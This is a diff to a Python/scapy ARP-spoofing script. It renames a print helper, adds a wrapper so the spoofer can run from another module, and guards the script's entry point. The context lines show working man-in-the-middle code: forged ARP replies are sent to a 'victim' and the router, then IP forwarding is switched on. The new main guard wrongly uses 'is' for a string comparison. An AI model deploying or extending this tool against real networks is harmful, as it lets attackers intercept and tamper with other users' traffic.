@@ -16,7 +16,7 @@ victimMAC = None
 routerMAC = None
 
 
-def print_f(string):
+def print_force(string):
     """This method is required because when this python file is called as a script
     the prints don't appear and a flush is required """
 
@@ -42,7 +42,7 @@ def grab_MAC_Addresses():
 
     if victimMAC is not None and routerMAC is not None:
         loop = False
-        print_f("[!] MAC Addresses obtain successfully!")
+        print_force("[!] MAC Addresses obtain successfully!")
         print("[*] Router mac: \'", routerMAC, '\'')
         print("[*] Victim mac: \'", victimMAC, '\'')
     else:
@@ -55,7 +55,7 @@ def spoof(routerIP, victimIP):
     # Sends the arp replies
     #   "op = 2" - '2' is the opcode for a reply
 
-    print_f("[*] Spoofing")
+    print_force("[*] Spoofing")
     send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=scapyVerbose)
     send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=scapyVerbose)
 
@@ -98,10 +98,22 @@ def run():
             time.sleep(5)
 
     except KeyboardInterrupt:
-        print_f("\n[!] Spoofing stopped!")
+        print_force("\n[!] Spoofing stopped!")
         restore(routerIP, victimIP)
         set_ip_forward(False)
         sys.exit(0)
+
+
+def arp_spoof_external(inter, victim, router):
+    """This allows this script to be run from another module"""
+
+    global interface, victimIP, routerIP
+
+    interface = inter
+    victimIP = victim
+    routerIP = router
+
+    run()
 
 
 def valid_ip(ip_address):
@@ -146,7 +158,7 @@ def parameters():
     valid_ip(victimIP)
     valid_ip(routerIP)
 
-    print_f('[*] Arp Spoofing beginning!')
+    print_force('[*] Arp Spoofing beginning!')
     run()
 
 
@@ -154,4 +166,6 @@ def parameters():
 if os.getuid() != 0:
     exit("Error: User needs to be root to run this script")
 
-parameters()
+
+if __name__ is "__main__":
+    parameters()
